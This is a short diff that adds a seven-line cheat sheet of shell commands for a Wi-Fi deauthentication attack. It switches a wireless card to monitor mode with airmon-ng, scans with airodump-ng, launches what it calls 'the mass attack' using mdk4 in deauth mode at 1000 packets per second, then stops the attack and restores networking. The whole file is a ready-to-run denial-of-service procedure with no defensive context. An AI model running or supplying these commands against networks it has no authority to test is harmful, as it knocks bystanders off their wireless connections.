@@ -1,0 +1,7 @@
+Clean background processes: airmon-ng check kill
+Start monitor mode: airmon-ng start wlan0
+Start channel hopping in a new tab: airodump-ng wlan0mon
+Launch the mass attack: mdk4 wlan0mon d -s 1000
+Stop everything using a new tab: killall -9 mdk4
+Turn off monitor mode: airmon-ng stop wlan0mon
+Restore normal internet: systemctl restart NetworkManager
